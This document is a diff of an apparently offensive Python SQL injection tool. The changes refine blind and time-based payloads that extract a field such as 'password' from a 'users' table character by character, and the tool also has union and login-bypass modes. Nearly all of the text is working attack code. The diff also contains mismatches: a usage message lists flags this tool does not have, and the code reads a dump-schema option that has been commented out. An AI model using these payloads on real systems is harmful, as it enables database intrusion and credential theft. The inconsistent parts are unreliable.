@@ -66,13 +66,17 @@ def blind_extract(url, val, data_length=20, charset=string.printable):
 
         for char in charset:
 
-            result = check_url(url, f"{val}{CONF['breaker']} AND SUBSTRING({CONF['column']}, {idx}, 1) = '{char}'")
+            payload = f"{val}{CONF['breaker']} AND BINARY SUBSTRING({CONF['column']}, {idx}, 1) = '{char}'-- -"
+            result = check_url(url, payload)
             check = check_result(result)
 
+            print(f"\r[+] Found : {data_found + char}", end='')
+            
             if check:
                 data_found += char
                 break
 
+    print("")
     return data_found
 
 
@@ -80,7 +84,9 @@ def blind_data_length(url, val):
     data_length = 0
 
     while True:
-        result = check_url(url, f"{val}{CONF['breaker']} AND length({CONF['column']}) >= {data_length + 1}-- -")
+        payload = f"{val}{CONF['breaker']} AND length({CONF['column']}) >= {data_length + 1}-- -"
+        #print(payload)
+        result = check_url(url, payload)
         check = check_result(result)
 
         if check:
@@ -155,7 +161,8 @@ def time_extract(url, val, data_length=20, charset=string.printable):
 
             start_time = time.time()
 
-            result = check_url(url, f"{val}{CONF['breaker']} AND IF (SUBSTRING({CONF['column']}, {idx}, 1) = '{char}', sleep({CONF['time_delay']}), 'false')-- -")
+            payload = f"{val}{CONF['breaker']} AND IF (BINARY SUBSTRING({CONF['column']}, {idx}, 1) = '{char}', sleep({CONF['time_delay']}), 'false')-- -"
+            result = check_url(url, payload)
             #check = check_result(result)
 
             if (time.time() - start_time) >= CONF['time_delay']:
@@ -173,7 +180,8 @@ def time_data_length(url, val):
 
         start_time = time.time()
 
-        result = check_url(url, f"{val}{CONF['breaker']} AND IF (length({CONF['column']}) = {data_length}, sleep({CONF['time_delay']}), 'false')-- -")
+        payload = f"{val}{CONF['breaker']} AND IF (length({CONF['column']}) = {data_length}, sleep({CONF['time_delay']}), 'false')-- -"
+        result = check_url(url, payload)
         #check = check_result(result)
 
         if (time.time() - start_time) >= CONF['time_delay']:
@@ -183,31 +191,44 @@ def time_data_length(url, val):
     #payload = "1' AND (SELECT 8889 FROM (SELECT(SLEEP(5)))HhUy) AND 'lDLY'='lDLY"
 
 
+def msg_usage(name=None):
+    return f'''
+Basic : 
+    {name} -c 18 -a 10 -n 1
+Specify performance settings : 
+    {name} -c 18 -a 10 -n 1 -p 10 -d 9.6 -s 128
+Repeater stuff :
+    {name} -c 18 -a 10 -n 1 -x client
+'''
+
 
 print()
 parser = argparse.ArgumentParser(description='HTTP POST bruteforcer')
-parser.add_argument('-u', '--url', required=True, help='URL to bruteforce')
-parser.add_argument('-x', '--headers', action='append', help='Additionnal headers, format HEADER:VALUE Use ^SQLI^ as placeholder')
-parser.add_argument('-c', '--cookies', action='append', help='Cookies. Standard format : NAME:VALUE Use ^SQLI^ as placeholder')
-parser.add_argument('-p', '--post-data', default='', help='POST body to send. Standard format : var1=val1&var2=val2 Use ^SQLI^ as placeholder')
-parser.add_argument('-g', '--get-data', default='', help='GET data to send. Standard format : var1=val1&var2=val2 Use ^SQLI^ as placeholder')
-parser.add_argument('-f', '--field', default='password', help='Field to extract')
-parser.add_argument('-t', '--table', default='users', help='Table to extract from')
-parser.add_argument('-m', '--method', default='POST', help='HTTP method to use')
-parser.add_argument('-a', '--action', default='', help='What do I do ? blind, union, login, time')
-parser.add_argument('-d', '--dump-schema', default=False, action='store_true', help='dump database schema')
-parser.add_argument('-v', '--value', default='', help='valid value')
+parser.add_argument('-u', '--url', metavar='', required=True, help='URL to bruteforce')
+parser.add_argument('-m', '--method', metavar='', default='POST', choices=['GET','POST'], help='HTTP method to use')
+
+group1 = parser.add_argument_group('Request parameters')
+group1.add_argument('-x', '--headers', metavar='', action='append', help='Additionnal headers, format HEADER:VALUE Use ^SQLI^ as placeholder')
+group1.add_argument('-c', '--cookies', metavar='', action='append', help='Cookies. Standard format : NAME:VALUE Use ^SQLI^ as placeholder')
+group1.add_argument('-p', '--post-data', metavar='', default='', help='POST body to send. Standard format : var1=val1&var2=val2 Use ^SQLI^ as placeholder')
+group1.add_argument('-g', '--get-data', metavar='', default='', help='GET data to send. Standard format : var1=val1&var2=val2 Use ^SQLI^ as placeholder')
+
+group2 = parser.add_argument_group('SQLi options')
+group2.add_argument('-f', '--field', metavar='', default='password', help='Field(s) to extract, (password or username,password)')
+group2.add_argument('-t', '--table', metavar='', default='users', help='Table to extract from')
+group2.add_argument('-a', '--action', metavar='', default='', choices=['blind','union','login','time'], help='Type of injection to execute')
+#group2.add_argument('-d', '--dump-schema', metavar='', default=False, action='store_true', help='Edump database schema')
+group2.add_argument('-v', '--value', metavar='', default='', help='Valid value used to check if SQLi is working')
 
 #group = parser.add_mutually_exclusive_group(required=True)
-parser.add_argument('-s', '--success', metavar='MSG SUCCESS', help='Success string to look for')
-parser.add_argument('-e', '--error', metavar='MSG ERROR', help='Error string to look for')
+group3 = parser.add_argument_group('Result detection')
+group3.add_argument('-s', '--success', metavar='', help='Success string to look for')
+group3.add_argument('-e', '--error', metavar='', help='Error string to look for')
 #args = parser.parse_args()
 args, leftovers = parser.parse_known_args()
 
 
-
-
-CONF['breaker'] = "" #"'"
+CONF['breaker'] = "'"
 CONF['bad_value'] = '-1'
 CONF['sep_col'] = '|||'
 CONF['sep_line'] = '%%%'
@@ -245,6 +266,7 @@ if args.dump_schema:
 
 url = args.url
 print("[+] URL :", url)
+print("[+] CONF :", CONF)
 
 
 if args.action == 'login':
@@ -259,7 +281,7 @@ if args.action == 'login':
 elif args.action == 'blind':
     data_length = blind_data_length(url, CONF['value'])
     print("Found length :", data_length)
-    data_found = blind_extract(url,data_length, CONF['value'])
+    data_found = blind_extract(url, CONF['value'], data_length)
     print("Found data :", data_found)
 
 elif args.action == 'union':
